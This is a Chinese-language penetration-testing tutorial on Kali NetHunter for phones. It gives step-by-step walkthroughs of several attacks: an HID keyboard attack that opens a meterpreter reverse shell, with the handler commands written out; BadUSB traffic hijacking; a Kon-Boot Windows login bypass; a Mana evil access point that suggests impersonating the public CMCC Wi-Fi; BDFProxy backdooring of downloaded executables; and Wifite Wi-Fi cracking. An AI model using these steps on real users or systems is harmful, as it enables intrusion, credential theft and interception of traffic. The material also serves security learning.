# Pocket Hacking: NetHunter实战指南

0x00 前言
=======

* * *

许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.

Kali NetHunter是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android实现的便携渗透测试平台.熟悉的Kali使其易于上手,而图形化控制界面则使某些测试更易.基于此平台,工程师们也可自由发挥,加入个人项目.

关于NetHunter国内外文章相对较少且重复度高,故在此将其主要实战技巧加以整理介绍,以备各位爱好者参考.由于资料不足,难免出错之处,如有疏漏错误,望不吝赐教.

0x01 硬件支持
=========

* * *

NetHunter官网给出以下支持刷入NetHunter的手机:

```
Nexus 4 (GSM) - “mako”
Nexus 5 (GSM/LTE) - “hammerhead”
Nexus 7 [2012] (Wi-Fi) - “nakasi”
Nexus 7 [2012] (Mobile) - “nakasig”
Nexus 7 [2013] (Wi-Fi) - “razor”
Nexus 7 [2013] (Mobile) - “razorg”
Nexus 10 (Tablet) - “mantaray”
OnePlus One 16 GB - “bacon”
OnePlus One 64 GB - “bacon”

```

值得一提的是,2015年NetHunter更新,由于1+手机的廉价与高性能,其被加入支持列表.用1+手机的朋友有福了,以下刷机以Nexus5为例.

0x02 刷机流程
=========

* * *

官网给出几种刷机方式,推荐使用Windows引导刷机程序安装.下载地址:

[https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe](https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe)

打开安装引导程序,默认路径安装

![img](http://drops.javaweb.org/uploads/images/1c4816a2ef17a635f0c4ca29a6d41f76ba14e785.jpg)

安装后自动运行NetHunter Installer并更新,进入引导安装步骤

*   Step1,选择已有硬件设备型号.

![img](http://drops.javaweb.org/uploads/images/279d125969e5edd2d5d9156f55805a99e2d21b42.jpg)

*   Step2,安装驱动

![img](http://drops.javaweb.org/uploads/images/602a47ef4e5b5ba8b1fffb02da1da4fd72081213.jpg)

![img](http://drops.javaweb.org/uploads/images/d1c770a57f396d4817d7efcb2555100b264d09df.jpg)

可以通过Test Drivers测试是否安装成功

*   Step3,安装选项

![img](http://drops.javaweb.org/uploads/images/0b39e0a04e44fc7f14b76ed3f0b02d223198a452.jpg)

如已经通过官网下载过刷机包,通过Browser选择文件.下载链接[http://www.offensive-security.com/kali-linux-nethunter-download/](http://www.offensive-security.com/kali-linux-nethunter-download/)下载后记得校验SHA1值.至于Android Flash Setting,因为对Android L的支持还未完成,故尚未开放选择.

*   Step4,下载文件

![img](http://drops.javaweb.org/uploads/images/d37b040af25d6b9c0b7058925e497601ebeecc92.jpg)

如图示,下载所有依赖文件.

![img](http://drops.javaweb.org/uploads/images/579e7449b941dfe2996af0c66a30d8e82ff5d877.jpg)

所有依赖包都为Ready可进入下一步刷机.

*   Step5,解锁设备

![img](http://drops.javaweb.org/uploads/images/ee8d42304dc4aba08dbad22009adfb759c9e16a3.jpg)

解锁bootloader,注意需设置允许USB调试,手机会重启解锁.

*   Step6,重置原Android

![img](http://drops.javaweb.org/uploads/images/2da5ecf349af43c866ce5644a36ecf161fb7b5bd.jpg)

同样再手机上勾选允许USB调试,注意数据会清空,记得备份.

![img](http://drops.javaweb.org/uploads/images/3858a3cde1a308c9584f3bdbeaa64a52c64b7844.jpg)

*   Step7,刷入NetHunter

![img](http://drops.javaweb.org/uploads/images/7a1a95fdbc61b3be740a25805277e742fbafc8fa.jpg)

经过上一步重置手机后,需重新开启开发者模式,此时可刷入Kali Linux镜像并对手机进行Root,所需时间相对较长.(注:如镜像推送不成功,可以手工将kali_linux_nethunter_1.10_hammerhead_kitkat.zip复制到/sdcard/download/目录进行INSTALL)

*   Final,安装成功

![img](http://drops.javaweb.org/uploads/images/e02f23523e82fe2f6ddfd8ab6e3d45daaa6f2b24.jpg)

![img](http://drops.javaweb.org/uploads/images/fc690cb9576fed12554db7e9910aab0caa30db97.jpg)

0x03 推荐APP一览
============

* * *

完成系统刷入后,要丰富NetHunter原装工具,可以下载部分安卓APP以配合.以下为个人推荐

*   中文输入法:作为一个汉语狗还是必备的
    
*   文件管理器(如RootExplorer):Kali某些文件需要通过支持Root权限的文件管理器.
    
*   ShadowSocks:梯子还是要有的
    
    [https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk](https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk)
    
*   MiTM工具:
    
    ```
    zANTI2:虽为商业化限制部分功能,但使用体验的确好些.
    dSploit:曾经很出名
    lanmitm:国内安全工作者编写发布的工具
    Intercepter-NG:嗅探工具 
    Network Spoofer:自带许多调戏功能
    
    ```
*   IPTools:部分常见基本网络工具集合
    
    ![img](http://drops.javaweb.org/uploads/images/8b1acc56326c72b49fcf7e5a65c02cc79a43dbfb.jpg)
    
*   ChangeHostname:修改当前手机主机名HostName(还是有必要的).
    
*   WiGLE wifi:War Driving工具,收集无线热点信息,可保存到本地数据库.
    
*   SQLiteEditor:方便读取数据库信息
    
*   Hacker's KeyBoard:NetHunter自带,便于输入各种控制字符
    
*   远程桌面:NetHunter自带,便于连接VNC服务.
    
*   DriveDroid:NetHunter自带,将手机内镜像模拟为启动盘.
    

0x04 目录与服务
==========

* * *

安装好NetHunter,先要对其目录与服务研究一番.Kali NetHunter根目录对应安卓系统目录的/data/local/kali-armhf目录

![img](http://drops.javaweb.org/uploads/images/72a082aa034b46741d25ced064531f77fec1d0bd.jpg)

NetHunter自带工具,也多在此目录内.故如有抓包/日志等文件,找不到存放地址,不妨到此目录下寻觅一番(注:需Root权限).另外,NetHunter某些工具运行时的提示的目录,也多以此处为根目录.

通常,截获的数据包等文件存放在NetHunter目录下的Captures目录:

![img](http://drops.javaweb.org/uploads/images/b0765b8c2836cf42c7594ae68f14a9757ba4a02e.jpg)

与Kali Linux类似,/usr/share下存放了大部分工具,并建立link,命令行可直接调用.

![img](http://drops.javaweb.org/uploads/images/e3a1dadf7d371652aec6db7f7c6d87d01b6a7e32.jpg)

而Metasploit则依然位于/opt/目录下.

![img](http://drops.javaweb.org/uploads/images/8d53974637b0c30010e1c33fbad8fc04345f193b.jpg)

上图中/opt/dic目录则存放有字典文件,可自行补充.

![img](http://drops.javaweb.org/uploads/images/8b09b99b8465f1b2f33ec2dd53385231e653297a.jpg)

此为/var/www目录,想来大家也知道是何用处了:)

至于服务,Offensive Security团队在新版中加入NetHunter Home以APP的形式管理服务开关,避免了之前版本通过WebServer管理的弊端(比如Web页面调用Google Fonts被墙卡半天 ;)

![img](http://drops.javaweb.org/uploads/images/abd2fcce48e09579a38603044324082d9b73f60d.jpg)

如图示,NetHunter Home为主页面,除了Offensive Security的Banner,还可以获取当前IP(内网/外网)地址.

![img](http://drops.javaweb.org/uploads/images/1ac2b245d6fbc2a0dcd9a5e9e467af3b8966e656.jpg)

Kali Launcher整合了四个启动器:

*   终端打开一个Kali Shell
*   终端打开Kali NetHunter Menu
*   终端打开Wifite进入无线破解
*   更新Kali NetHunter(执行sudo -c bootkali update)

对于NetHunter服务开关控制,则在Kali Service Control面板里进行设置

![img](http://drops.javaweb.org/uploads/images/f5c0e7c2a5a25ed16be04a7755a7b5f38d6bc8b6.jpg)

可看到,NetHunter可开放服务有SSH,Dnsmasq,Hostapd,OpenVPN,Apache,Metasploit及BeEF FrameWork等.

*   SSH服务:Secure Shell,方便其他设备连接控制.
*   Dnsmasq服务:DNS解析服务.
*   Hostapd服务:提供无线接入点服务.
*   OpenVPN服务:开放OpenVPN连入服务.
*   Apache服务:WEB服务.
*   Metasploit服务:为MSF攻击模块提供保障.
*   BeEF FrameWork服务:XSS利用框架服务.

在此面板可对对应服务进行开关设置.

0x05 Kali NetHunter Menu
========================

* * *

在NetHunter Launcher中Kali Menu的启动项,其包含整理有NetHunter常用工具,如图:

![img](http://drops.javaweb.org/uploads/images/2e8fde3cb3035c5bd5ba8e46182f00afc595ea83.jpg)

与上一个版本相比，新增了以下选项:

```
USB Attacks
NFC Attacks
Monitor Mode
Eject USB Wifi

```

主要模块及介绍如下:

**Wireless Attacks**

*   Wifite
    
    自动无线安全审计工具
    
*   Kismet
    
    无线WarDriving工具
    
*   AP F**ker
    
    无线网恶意攻击工具(多为拒绝服务)
    
*   Wash
    
    扫描开启WPS的无线网络
    
*   Airodump-ng
    
    基本无线攻击套件(必备)
    
*   Pingen
    
    针对某些开启WPS的D-link的路由器计算其PIN码以破解
    

**Sniffing/Spoofing**

*   tcpdump
    
    基本流量Dump工具
    
*   tshark
    
    WireShark的Cli工具,可抓取分析流量
    
*   urlsnarf
    
    Dsniff工具包一部分,可嗅探HTTP请求包内容，并以CLF通用日志格式输出
    
*   dsniff
    
    强大的知名口令嗅探工具包
    
*   MITMproxy
    
    中间代理,可截获修改HTTP流量,参考官网介绍
    

**Reverse Shells**

*   AutoSSH
    
    通过SSH反弹shell(NAT Bypass)
    
*   pTunnel
    
    通过ICMP数据包隧道传送数据
    

**Info Gathering**

*   Spiderfoot
    
    开源扫描与信息收集工具,对给定域名收集子域,Email地址,web服务器版本等信息,自动化扫描.
    
*   Recon-ng
    
    强大的信息收集工具,模块化,可惜许多插件国内不适用(有墙).
    
*   Device-pharmer
    
    通过Shodan搜索,大数据Hacking.
    

**Vulnerability Scan**

*   OpenVas
    
    漏洞扫描器,需额外安装.Kali一直默认包含,好不好用客官自行定夺. :)
    

**Exploit Tools**

*   Metasploit
    
    强大,核心,必备
    
*   BeEF-XSS
    
    XSS渗透测试工具,看个人习惯使用
    
*   Social-Engineering-Toolkit
    
    Kali下的SET,社会工程学套件,功能强大.
    
*   MITMf
    
    中间人攻击框架,基于Python,拥有多个插件,渗透测试功能强大
    

**OpenVPN Setup**

OpenVPN设置

**VNC Setup**

VNC设置

**Log/Capture Menu**

可擦除本地所有抓取数据或同步到SD卡上(同步主要是解决权限问题.比如多数安卓APP未获得root权限是无法读取NetHunter工具截获的数据内容)

**USB Attacks**

*   Dictionary based brute force attack
    
    自动输入字典一行内容并回车,基于HID,模拟操作方式的暴力破解
    
*   deADBolt
    
    执行一堆ADB命令可以推送隐私文件等信息到指定目录,参考项目主页 https://github.com/photonicgeek/deADBolt
    

**NFC Attack**

提供了复制、重写、查看M卡数据功能(是不是不必带上Acr122u了;)

**Settings**

*   修改时区
*   为Metasploit创建用户和数据库
*   修改MAC地址
*   安装NodeJS

**Service**

*   SSH服务开关
*   VNC服务开关
*   OpenVPN服务开关
*   在本地启动Xserver

**Monitor Mode**

启动或关闭wlan1(外置无线网卡)的混杂监听模式

**Eject USB Wifi**

弹出USB无线网卡

0x06 HID KeyBoard Attack
========================

* * *

在过去,USB自启往往依赖插入的USB设备中的autorun.inf实现.时下这招往往不灵,而新兴的USB HID Attack则成为新的安全威胁.USB HID可通过模拟键盘或鼠标操作,实时执行目标代码,在此以PowerSploit结合MSF为例:

首先运行提供payload的webserver,在Kali Service Control中开启Apache服务器

![img](http://drops.javaweb.org/uploads/images/4b3b17bd3d7ec049a8f511b372a3e6f126816388.jpg)

转到HID攻击配置页面,选择PowerSploit

![img](http://drops.javaweb.org/uploads/images/7642b82b5990b7adb764ca15f7d61727b05a0ef0.jpg)

IP和端口填写MSF监听的IP端口,Payload我们选择windows/meterpreter/reverse_https,URL为提供Apache服务的IP,这里即本机:192.168.1.151

配置好后UPDATE配置文件,接下来需配置MSF监听反弹shell

```
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) >

```

payload同HID配置页面中的payload

```
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https

```

IP和端口同样设置

```
msf exploit(handler) > msf exploit(handler) > set LHOST 192.168.0.17
LHOST => 192.168.0.17
msf exploit(handler) > set LPORT 4444
LPORT => 443
msf exploit(handler) > exploit

[*] Started HTTPS reverse handler on https://0.0.0.0:4444/
[*] Starting the payload handler...

```

至此配置OK

![img](http://drops.javaweb.org/uploads/images/2da52f14b49773708f68173aa0a27d470b5fe304.jpg)

开始监听

![img](http://drops.javaweb.org/uploads/images/ba1c2ac7ccfe21974ba261a0da82ebd97a1461b5.jpg)

此时将设备连接至PC机,等待设备被识别后,执行Execute,攻击开始.

POWERSHELL命令执行后,就可在msf中看到反弹的shell了:

![img](http://drops.javaweb.org/uploads/images/a8f07176bf909965d0ad0b3d25b888b17c61a486.jpg)

如连上PC后没有反应,可按Reset USB键更新.

当然,HID KeyBoard Attack也提供了Windows CMD攻击模块,即连入计算机后自动打开CMD并执行指定命令(默认为添加新管理员用户,可自由定制).

0x07 BadUSB MITM Attack
=======================

* * *

BadUSB Attack是BlackHat大会上公布的一种较先进的USB攻击方式,模拟键盘操作等Payload可自动执行某些操作,而NetHunter的BadUSB MiTM Attack则是其中一种玩法:修改网络设定,劫持网络流量.

关于BadUSB MITM Attack,NetHunter官网有演示视频,详见[http://www.nethunter.com/showcase/](http://www.nethunter.com/showcase/),但并未交代详细过程,以下笔者操作为例:

首先,确保手机连接目标计算机时,MTP文件传输是关闭的.连接目标计算机,打开手机USB网络共享:

![img](http://drops.javaweb.org/uploads/images/896cacfe264e1e3623c2d686cfcf884050a13518.jpg)

此时在NetHunter Home打开一个Kali Shell,查看网卡多出虚拟网卡rndis0(USB网络共享网卡).

![img](http://drops.javaweb.org/uploads/images/40a25515370f56a3249674c571e4c68644c3e8e0.jpg)

此时可以开启Tcpdump截获流量,命令如:

```
tcpdump -i rndis0

```

回到NetHunter Home,切换到BadUSB MiTM Attack,勾选右上角选项Start BadUSB Attack

![img](http://drops.javaweb.org/uploads/images/0735a287120053a027eb6d28ad0f78cf18b56385.jpg)

被连接的计算机此时会多出一个网卡,网关为rndis0的IP地址

![img](http://drops.javaweb.org/uploads/images/1f8b5d3434e31f8b18c3aff881fd0d8bfc56515b.jpg)

此时流量已可以截获,例如访问某些网站,手机tcpdump处流量显示如图:

![img](http://drops.javaweb.org/uploads/images/6c147494437f0e2ff0ad32bb48a5fa6d9bf6233c.jpg)

因为手机并未插入SIM卡,无网络,故PC机并无法得到返回页面.

之前有同学在Drops分享的一片文章[Kali Nethunter初体验](http://drops.wooyun.org/tools/3113)中提到:

> 出现双网关现在所以并未像官网演示的那样流量直接走向恶意网关（10.0.0.1）而是依旧走的之前的网关（192.168.1.1）故劫持失败

这种情况也可能出现,不过个人测试中,网络连接优先级,默认劫持后的网关优先级更高,故流量可以正常劫持.也可能是NetHunter今年更新后做的优化,如图示:

![img](http://drops.javaweb.org/uploads/images/cb1da5913b3c925043d4f7b0571e734407b5802e.jpg)

当然,配合HID Keyboard Attack进行攻击测试也是很好的方式,至于数据包的保存与分析,则可自行发挥.

0x08 绕过Windows登录认证
==================

* * *

NetHunter其实有许多隐藏玩法,比如借助DriveDroid实现Windows登陆绕过密码.

DriveDroid本是个允许通过安卓手机中的ISO/IMG镜像文件引导启动PC机的一个App,但结合了特定的镜像,实现绕过Windows登陆认证就变得可行:)

在此以Win7为例,首先为默认账户创建密码hello.

![img](http://drops.javaweb.org/uploads/images/2b3ca141d3b2aceee6864e8df1eff93a898e058d.jpg)

DriveDroid默认引导镜像存放目录位于SDCard/Download/images,只需将欲引导的镜像存放于此目录即可.

![img](http://drops.javaweb.org/uploads/images/5a086ef3340bd65a09e83b5d9c3f0d39a28006d1.jpg)

这里绕过Windows或OSX登陆认证的镜像为Kon-Boot.可以到官网了解,其原理在于处理BIOS修改系统内核的引导处理,跳过SAM检查,直接登陆系统.因为是付费软件,以下以自行寻觅的镜像为例演示.

关闭MTP文件传输,打开DriveDroid,自动列出images目录下得镜像文件.

![img](http://drops.javaweb.org/uploads/images/f42a25875ffe510b770f35abcfcf8fa1d2ec0805.jpg)

选择Kon-Boot.img镜像挂载,模式这里选择为Read-Only USB

![img](http://drops.javaweb.org/uploads/images/09368cae2fb8ddb61d0672cc8c8ea8367ba99d7e.jpg)

加载成功后相应镜像有所标志

![img](http://drops.javaweb.org/uploads/images/626a531ec3317dc93f8bbd338f7fc50ed9aa2e0c.jpg)

而在连入的PC机中也会显示加载有新的可移动磁盘(或软驱盘),如未能显示,可在配置页面进行相应调整(可通过USB Setup Wizard向导指引)

![img](http://drops.javaweb.org/uploads/images/83ef3529d234f9dfacc47f8e13487c9456d4a8aa.jpg)

此时在设有密码的PC机重启,进入BIOS设置启动项

![img](http://drops.javaweb.org/uploads/images/bbe81fceef243febc68008a2b3c40fca93af034d.jpg)

如果镜像加载成功,可以看到飞奔的图案如下:

![img](http://drops.javaweb.org/uploads/images/dd9380553be34670da34809c81f8f55e029fa721.jpg)

之后登陆用户密码处回车即可绕过密码认证登陆系统

![img](http://drops.javaweb.org/uploads/images/a6841dd6e5753a4eca13b5e882f522a16875bf02.jpg)

需要说明的是,通过此方式登陆系统无法直接修改或删除系统密码.

0x09 WarDriving
===============

* * *

犹记得当年前辈们肩扛笔记本做WarDriving的事迹,智能设备发展至今,WarDriving已可用便携设备取代.只是至今迟迟没有寻觅到比较合适直观的WarDriving工具,期待有朋友能开发或推荐个.

在NetHunter下,Kali-Menu的Wireless模块中Kismet作为WarDriving的默认工具,不过操作起来画面太美不敢看:

![img](http://drops.javaweb.org/uploads/images/8e7210b52e2be66466b8be30dd4ae5dd62bd882e.jpg)

退而求其次,推荐使用App WigleWifi.不过注意不要不小心上传数据.使用easy,界面很难看.

![img](http://drops.javaweb.org/uploads/images/f987e10e5a08bffc4452ad7ed02f12ec15193fb6.jpg)

好在数据可以以Sqlite数据库格式存储在本地.

0x10 Mana EvilAP蜜罐
==================

* * *

想建个CMCC无线网络钓鱼劫持流量?PineApple没有带在身边,不妨拿出手机,开个蜜罐吧. :)

Mana蜜罐采用与PineApple相同的:Hostapd的Karma补丁,可用来欺骗接入无线网络用户，使其可很平滑连接到虚假AP中，进行后续攻击.

需要说明的是,NetHunter无线攻击模块,大都需要使用OTG外接USB无线网卡.主流芯片(可以试试Kali是否可直接识别)网卡均可.WN722N较为推荐,迷你的EDUP网卡通用性则较强(Raspberry Pi也可直接识别),只是信号强度..自然可想而知.

![img](http://drops.javaweb.org/uploads/images/8ba6a482ddc44c34adbe464de148e0266750d82e.jpg)

Mana蜜罐有多种Hacking模式,均为sh脚本,可自由定制.Mana工具安装目录为:

```
/usr/share/mana-toolkit

```

启动脚本则在此处存放:

```
/usr/share/mana-toolkit/run-mana

```

截获流量文件存放于:

```
/var/lib/mana-toolkit

```

通过NetHunter Home的Mana蜜罐页面可方便的对配置文件进行修改:

Hostapd配置文件

![img](http://drops.javaweb.org/uploads/images/84e4b4182c44c63467457fa674b59a4e7ebb24be.jpg)

DHCP服务配置文件

![img](http://drops.javaweb.org/uploads/images/370f31fb72da9dd9a7092ef874d4a42440b64dea.jpg)

DNS欺骗配置文件

![img](http://drops.javaweb.org/uploads/images/eeba296a820b8df4572062c2857f0259c4372438.jpg)

服务启动脚本有多个,均可自由编辑修改:

![img](http://drops.javaweb.org/uploads/images/7a181937abef61e83395d467f6d61dd6896107da.jpg)

上图对应脚本start-nat-full.sh,脚本需要USB无线网卡(存在上行流量)启动,无线连入为NAT模式,并启动所有脚本包括:firelamb,sslstrip,sslsplit等,截获流量并保存.

![img](http://drops.javaweb.org/uploads/images/da3d2fb09092c3488c46ec0eb0d5663aac30637b.jpg)

start-nat-simple.sh同样有上行流量,但并不启动firelamb,sslstrip,sslsplit等脚本.

![img](http://drops.javaweb.org/uploads/images/544a68971eb2f98f5f203467d0195e2ed0228a4d.jpg)

start-nat-simple-bdf.sh,加入了BDF恶意代码Inject工具,后面章节将对其攻击思路进行介绍.

此外,还有

start-noupstream.sh

```
Mana作为无法上网的虚假AP启动,但可吸引WIFI默认开启的终端自动连接并抓取信息.

```

start-noupstream-eap.sh

```
Mana同样无法上网,但会进行EAP攻击

```

编辑好启动文件后,Start Attack,会弹窗勾选启动脚本:

![img](http://drops.javaweb.org/uploads/images/884ae4055a77daa02604df0758b583f5a5f90e22.jpg)

即可启动服务.

0x11 Backdooring Executable Over HTTP
=====================================

* * *

这个攻击思路就比较有趣了,新功能在NetHunter今年1月5号发布的版本中作为Kali Nethunter目前最新最酷炫的玩法,源于[secret squirrel](https://github.com/secretsquirrel/)的github项目[the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory)和[BDFProxy](https://github.com/secretsquirrel/BDFProxy),可让我们轻松地对使用HTTP协议传送的二进制文件注入shellcode.

首先建立一个Mana蜜罐，SSID这里使用默认名称internet,启动服务

```
cd /usr/share/mana-toolkit/run-mana
./start-nat-simple-bdf.sh

```

![img](http://drops.javaweb.org/uploads/images/d21c1fd9ec0ddba48c569da6e1967e45568703fc.jpg)

再开一个Shell,编辑bdfproxy.cfg,此配置文件包含了针对不同平台默认设置的payload,可自行更换.不过由于显示问题,用nano编辑文本会一行行刷新,还是换个方式编辑比较好.这里只把IP修改192.168.1.151,也可在Nethunter的主面板下的MANA Evil Access Point中进行配置.

```
nano /etc/bdfproxy/bdfproxy.cfg

```

配置好IP之后,在Shell中直接输入bdfproxy运行之.

再新开一个Shell启动Metasploit

![img](http://drops.javaweb.org/uploads/images/46c72cd46cc9179c82c93fbaf811ac1cd46bff4f.jpg)

一切准备就绪,等待连入蜜罐AP的PC机上网下载二进制文件,在此通过百度下载everything(神器啊)演示:

![img](http://drops.javaweb.org/uploads/images/1387f9b44310043009e3c5c6f0ff58241a87c65e.jpg)

运行everthing,因为注入了payload,会出现自校验失败的提示

![img](http://drops.javaweb.org/uploads/images/623062d50f6677648334f21074a7c13f7e9ad624.jpg)

查看MSF,已成功反弹回Shell了.而上面自校验失败的提示就是MeterPreter的screenshot帮我截取的 :)

![img](http://drops.javaweb.org/uploads/images/a60bf3da2771f07194a884005f564daeb97f46f7.jpg)

不得不说,这个新特性真的很Cool.

0x12 Wifite破解
=============

* * *

写到最后,还没有提到无线破解是不科学的;) NetHunter推荐的Wifite破解工具是其最早集成的功能之一.移动设备的便携性更有利于随时随地进行Wifi安全测试,只需挂载上外置无线网卡便可轻松抓包破解.不过并不建议直接在移动设备上破解抓到的包,如跑几分钟没结果,就拿高性能设备破解吧,否则易导致设备死机.

连接好外置无线网卡后,在Nethunter主菜单选择Launch Wifite即可进入

![img](http://drops.javaweb.org/uploads/images/630955de6712cc682897758a973cebdf32639ed9.jpg)

选择开启混杂监听模式的网卡,选择Wlan1

![img](http://drops.javaweb.org/uploads/images/922eb525d49bd7ba8bf1966d5b44fe8f87ab3f49.jpg)

扫描开始,每5秒更新一次,当确认攻击目标后CTRL+C停止扫描

![img](http://drops.javaweb.org/uploads/images/8a87d211f844e0d961264e6afc1c4d52674e5420.jpg)

输入攻击目标序号,这里就选`XDSEC-WIFI`了,输入2

![img](http://drops.javaweb.org/uploads/images/c15391d5ce6296c5a7dac46fbc24f801e682b6c5.jpg)

抓包成功后自动调用字典破解,这里机智的把字典删掉,其自动退出

![img](http://drops.javaweb.org/uploads/images/945d6d7ab8ad7c476cd9763dbfbdd0e4cb456bf5.jpg)

抓到的握手包存放在/data/local/kali-armhf/HS目录下,命名规则是SSID+MAC

![img](http://drops.javaweb.org/uploads/images/0c91ca3e5da383933b39bee7df0fd89f02321d24.jpg)

如果目标开启WPS,则自动进行PIN码破解.

Wifite相对傻瓜化,易操作,适合移动终端.对无线网密码测试笔者也成功过几次,连入无线后结合zANTI等工具调戏即可:)

0x13 写在最后
=========

* * *

文末,已将NetHunter大部分实战玩法进行相应介绍,文章为卷毛zing同学与顺毛le4f同学共同编写,能力有限,如有不足之处望指出.抛砖引玉,期待有更多技巧分享.